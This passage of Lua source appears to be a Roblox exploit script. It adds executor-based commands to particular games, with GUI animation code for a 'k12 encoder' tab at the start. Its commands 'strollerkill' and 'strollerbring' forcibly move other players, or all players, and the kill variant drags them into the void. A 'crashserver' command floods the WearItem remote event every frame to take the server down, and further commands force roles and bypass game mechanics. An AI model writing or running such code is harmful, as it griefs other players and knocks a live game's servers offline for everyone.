	uwu["k12 encoder and decoder tab main frame 1"].Visible = true
	local gui = uwu["k12 encoder and decoder tab block all"]
	uwu["k12 encoder and decoder tab top bar"].Visible = true
	uwu["k12 encoder and decoder tab top bar"].TextTransparency = 1
	uwu["k12 encoder and decoder tab top bar"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder tab main frame 1"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder tab top bar close button"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder tab top bar minimize button"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder tab top bar reposition button"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder tab top bar close button"].TextTransparency = 1
	uwu["k12 encoder and decoder tab top bar minimize button"].TextTransparency = 1
	uwu["k12 encoder and decoder tab top bar reposition button"].TextTransparency = 1
	uwu["k12 encoder and decoder tab main frame 1"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder input"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder input"].TextTransparency = 1
	uwu["k12 decode"].BackgroundTransparency = 1
	uwu["k12 decode"].TextTransparency = 1
	uwu["k12 encode"].BackgroundTransparency = 1
	uwu["k12 encode"].TextTransparency = 1
	uwu["clear k12 encoder and decoder input"].BackgroundTransparency = 1
	uwu["clear k12 encoder and decoder input"].TextTransparency = 1
	uwu["copy k12 encoder and decoder input"].BackgroundTransparency = 1
	uwu["copy k12 encoder and decoder input"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 545, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 545, 0, 268),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	uwu["k12 encoder and decoder tab top bar"].Visible = true
	uwu["k12 encoder and decoder tab top bar"].BackgroundTransparency = 0
	uwu["k12 encoder and decoder tab main frame 1"].BackgroundTransparency = 0
	uwu["k12 encoder and decoder tab top bar close button"].BackgroundTransparency = 0
	uwu["k12 encoder and decoder tab top bar minimize button"].BackgroundTransparency = 0
	uwu["k12 encoder and decoder tab top bar reposition button"].BackgroundTransparency = 0
	uwu["k12 encoder and decoder tab top bar close button"].TextTransparency = 0
	uwu["k12 encoder and decoder tab top bar minimize button"].TextTransparency = 0
	uwu["k12 encoder and decoder tab top bar reposition button"].TextTransparency = 0
	uwu["k12 encoder and decoder tab top bar"].TextTransparency = 0
	uwu["k12 encoder and decoder tab main frame 1"].BackgroundTransparency = 0
	uwu["k12 encoder and decoder input"].BackgroundTransparency = 0
	uwu["k12 encoder and decoder input"].TextTransparency = 0
	uwu["k12 decode"].BackgroundTransparency = 0
	uwu["k12 decode"].TextTransparency = 0
	uwu["k12 encode"].BackgroundTransparency = 0
	uwu["k12 encode"].TextTransparency = 0
	uwu["clear k12 encoder and decoder input"].BackgroundTransparency = 0
	uwu["clear k12 encoder and decoder input"].TextTransparency = 0
	uwu["copy k12 encoder and decoder input"].BackgroundTransparency = 0
	uwu["copy k12 encoder and decoder input"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("launchrocket", "lr", function()
	if game.PlaceId ~= 189707 then return end
	for _, model in ipairs(workspace:FindFirstChild("Structure"):GetChildren()) do
		if model:IsA("Model") then
			for _, descendant in ipairs(model:GetDescendants()) do
				if descendant:IsA("ClickDetector") and descendant.Parent then
					fireclickdetector(descendant, 0)
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

strollerkilling = false

addcommand("strollerkill", "skill", function(target)
	if game.PlaceId ~= 1662219031 then return end
	local function getTargetPlayer(partial)
		partial = partial:lower()

		if partial == "random" then
			local candidates = {}
			for _, player in ipairs(uwu["players"]:GetPlayers()) do
				if player ~= uwu["local player"] then
					table.insert(candidates, player)
				end
			end
			if #candidates > 0 then
				return candidates[math.random(1, #candidates)]
			else
				return nil
			end
		end

		if partial == "all" or partial == "others" then
			return partial
		end

		for _, player in ipairs(uwu["players"]:GetPlayers()) do
			if player ~= uwu["local player"] and player.Name:lower():find(partial) then
				return player
			end
		end

		return nil
	end

	local function yeetPlayer(target)
		local char = uwu["local player"].Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end
		if strollerkilling then return end
		strollerkilling = true

		local stroller = uwu["local player"].Backpack:FindFirstChild("Stroller") or char:FindFirstChild("Stroller")
		if not stroller then
			strollerkilling = false
			return
		end

		local targetChar = target.Character
		if not targetChar then 
			strollerkilling = false
			return 
		end

		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then 
			strollerkilling = false
			return 
		end

		local oldcframe = hrp.CFrame

		stroller.Parent = char
		t(0.1)

		targetHRP.CFrame = hrp.CFrame * CFrame.new(0, 0, -5)
		t(0.2)

		game.Workspace.FallenPartsDestroyHeight = 0 / 0
		targetHRP.CFrame = hrp.CFrame * CFrame.new(0, 0, -5)
		hrp.CFrame = CFrame.new(0, -3000, 0)
		t(0.2)

		stroller.Parent = uwu["local player"].Backpack
		t(0.2)

		hrp.CFrame = oldcframe
		t(0.1)

		hrp.CFrame = oldcframe
		strollerkilling = false
	end

	local input = target
	local target = getTargetPlayer(input)

	if not target then return end

	if target == "all" or target == "others" then
		for _, player in ipairs(uwu["players"]:GetPlayers()) do
			if player ~= uwu["local player"] then
				local char = player.Character
				if char and not (char:FindFirstChild("Stroller")) then
					yeetPlayer(player)
				end
			end
		end
	else
		yeetPlayer(target)
	end
end)

strollerbringing = false

addcommand("strollerbring", "sbring", function(target)
	if game.PlaceId ~= 1662219031 then return end
	local function getTargetPlayer(partial)
		partial = partial:lower()

		if partial == "random" then
			local candidates = {}
			for _, player in ipairs(uwu["players"]:GetPlayers()) do
				if player ~= uwu["local player"] then
					table.insert(candidates, player)
				end
			end
			if #candidates > 0 then
				return candidates[math.random(1, #candidates)]
			else
				return nil
			end
		end

		if partial == "all" or partial == "others" then
			return partial
		end

		for _, player in ipairs(uwu["players"]:GetPlayers()) do
			if player ~= uwu["local player"] and player.Name:lower():find(partial) then
				return player
			end
		end

		return nil
	end

	local function bringPlayer(target)
		local char = uwu["local player"].Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end
		if strollerbringing then return end
		strollerbringing = true

		local stroller = uwu["local player"].Backpack:FindFirstChild("Stroller") or char:FindFirstChild("Stroller")
		if not stroller then
			strollerbringing = false
			return
		end

		local targetChar = target.Character
		if not targetChar then 
			strollerbringing = false
			return 
		end

		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then 
			strollerbringing = false
			return 
		end

		local oldcframe = hrp.CFrame

		stroller.Parent = char
		t(0.1)

		targetHRP.CFrame = hrp.CFrame * CFrame.new(0, 0, -5)
		t(0.2)

		hrp.CFrame = oldcframe
		targetHRP.CFrame = hrp.CFrame * CFrame.new(0, 0, -5)
		t(0.1)

		hrp.CFrame = oldcframe
		stroller.Parent = uwu["local player"].Backpack

		strollerbringing = false
	end

	local input = target
	local target = getTargetPlayer(input)

	if not target then
		return
	end

	if target == "all" or target == "others" then
		for _, player in ipairs(uwu["players"]:GetPlayers()) do
			if player ~= uwu["local player"] then
				local char = player.Character
				if char and not (char:FindFirstChild("Stroller")) then
					bringPlayer(player)
					t(0.5)
				end
			end
		end
	else
		bringPlayer(target)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("kidrole", "kid", function()
	if game.PlaceId ~= 1662219031 then return end
	local targetPart = workspace:WaitForChild("SpawnSigns"):WaitForChild("SpawnLocation3")
	local function getCharacterRoot()
		local character = uwu["local player"].Character or uwu["local player"].CharacterAdded:Wait()
		return character:WaitForChild("HumanoidRootPart")
	end

	local function fireTouch(partA, partB)
		firetouchinterest(partA, partB, 0)
		t()
		firetouchinterest(partA, partB, 1)
	end

	task.spawn(function()
		local root = getCharacterRoot()
		fireTouch(root, targetPart)
	end)
end)

addcommand("parentrole", "parent", function()
	if game.PlaceId ~= 1662219031 then return end
	local targetPart = workspace:WaitForChild("SpawnSigns"):WaitForChild("SpawnLocation1")
	local function getCharacterRoot()
		local character = uwu["local player"].Character or uwu["local player"].CharacterAdded:Wait()
		return character:WaitForChild("HumanoidRootPart")
	end

	local function fireTouch(partA, partB)
		firetouchinterest(partA, partB, 0)
		t()
		firetouchinterest(partA, partB, 1)
	end

	task.spawn(function()
		local root = getCharacterRoot()
		fireTouch(root, targetPart)
	end)
end)

addcommand("petrole", "pet", function()
	if game.PlaceId ~= 1662219031 then return end
	local targetPart = workspace:WaitForChild("SpawnSigns"):WaitForChild("SpawnLocation2")
	local function getCharacterRoot()
		local character = uwu["local player"].Character or uwu["local player"].CharacterAdded:Wait()
		return character:WaitForChild("HumanoidRootPart")
	end

	local function fireTouch(partA, partB)
		firetouchinterest(partA, partB, 0)
		t()
		firetouchinterest(partA, partB, 1)
	end

	task.spawn(function()
		local root = getCharacterRoot()
		fireTouch(root, targetPart)
	end)
end)

addcommand("teenrole", "teen", function()
	if game.PlaceId ~= 1662219031 then return end
	local targetPart = workspace:WaitForChild("SpawnSigns"):WaitForChild("SpawnLocation4")
	local function getCharacterRoot()
		local character = uwu["local player"].Character or uwu["local player"].CharacterAdded:Wait()
		return character:WaitForChild("HumanoidRootPart")
	end

	local function fireTouch(partA, partB)
		firetouchinterest(partA, partB, 0)
		t()
		firetouchinterest(partA, partB, 1)
	end

	task.spawn(function()
		local root = getCharacterRoot()
		fireTouch(root, targetPart)
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("tospawn", "spawn", function()
	if game.PlaceId ~= 1662219031 then return end
	local function getCharacterRoot()
		local character = uwu["local player"].Character or uwu["local player"].CharacterAdded:Wait()
		return character:WaitForChild("HumanoidRootPart")
	end

	local spawnPart = workspace:WaitForChild("Spawn")

	local function teleportOnTop()
		local root = getCharacterRoot()
		local spawnCFrame = spawnPart.CFrame
		local yOffset = (spawnPart.Size.Y / 2) - 8
		root.CFrame = CFrame.new(spawnCFrame.Position + Vector3.new(0, yOffset, 0))
	end

	teleportOnTop()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("resetappearance", "rea", function()
	if game.PlaceId ~= 1662219031 then return end
	local targetPart = workspace:WaitForChild("Mall"):WaitForChild("Restore Clothing"):WaitForChild("pole")
	local function getCharacterRoot()
		local character = uwu["local player"].Character or uwu["local player"].CharacterAdded:Wait()
		return character:WaitForChild("HumanoidRootPart")
	end

	local function fireTouch(partA, partB)
		firetouchinterest(partA, partB, 0)
		t()
		firetouchinterest(partA, partB, 1)
	end

	task.spawn(function()
		local root = getCharacterRoot()
		fireTouch(root, targetPart)
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("waterwalker", "jesus", function()
	if game.PlaceId ~= 1662219031 then return end
	local point1 = Vector3.new(-359, 30, 188)
	local point2 = Vector3.new(-578, 29, -82)

	local size = (point1 - point2).Magnitude
	local minX = math.min(point1.X, point2.X)
	local minY = math.min(point1.Y, point2.Y)
	local minZ = math.min(point1.Z, point2.Z)

	local center = (point1 + point2) / 2
	local dimensions = Vector3.new(
		math.abs(point1.X - point2.X),
		math.abs(point1.Y - point2.Y),
		math.abs(point1.Z - point2.Z)
	)

	local part = Instance.new("Part")
	part.Anchored = true
	part.Size = dimensions
	part.Position = center
	part.Transparency = 1
	part.Color = Color3.fromRGB(163, 162, 165)
	part.Material = Enum.Material.SmoothPlastic
	part.TopSurface = Enum.SurfaceType.Smooth
	part.BottomSurface = Enum.SurfaceType.Smooth
	part.Name = "SpanPart"
	part.Parent = game.Workspace
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("antiskintonechanger", "astc", function()
	if game.PlaceId ~= 1662219031 then return end
	local mallPath = workspace:FindFirstChild("Mall")
	local changeSkinColorFolder = mallPath and mallPath:FindFirstChild("Change Skin Color")

	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name == "Smooth Block Model" then
			for _, descendant in ipairs(obj:GetDescendants()) do
				if descendant:IsA("TouchTransmitter") then
					descendant:Destroy()
				end
			end
		end
	end

	if changeSkinColorFolder then
		for _, item in ipairs(changeSkinColorFolder:GetDescendants()) do
			if item:IsA("Part") then
				for _, child in ipairs(item:GetChildren()) do
					if child:IsA("TouchTransmitter") then
						child:Destroy()
					end
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("crashserver", "crash", function()
	if game.PlaceId ~= 1662219031 then return end
	game:GetService'RunService'.RenderStepped:Connect(function()
		task.spawn(function()
			for i=0, 1000, 1 do

				local args = {
					[1] = {
						[1] = "Wear",
						[2] = "11297746",
						[3] = "Hats"
					}
				}

				game:GetService("ReplicatedStorage").WearItem:FireServer(unpack(args))
			end
		end)
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

task.spawn(function()
	repos(uwu["donut tab top bar"], 0, 276, 260 + 26)
	repos(uwu["video tab top bar"], 0, 208, 315 + 26)
	repos(uwu["gaydar tab top bar"], 0, 376, 230 + 26)
	repos(uwu["headcanon generator tab top bar"], 0, 446, 168 + 26)
	repos(uwu["message reverser tab top bar"], 0, 345, 168 + 26)
	repos(uwu["k12 encoder and decoder tab top bar"], 0, 545, 268 + 26)
	repos(uwu["top bar"], 0, 401, 250 + 26)
	repos(uwu["binary tab top bar"], 0, 246, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

task.spawn(movebutton)

-------------------------------------------------------------------------------------------------------------------------------
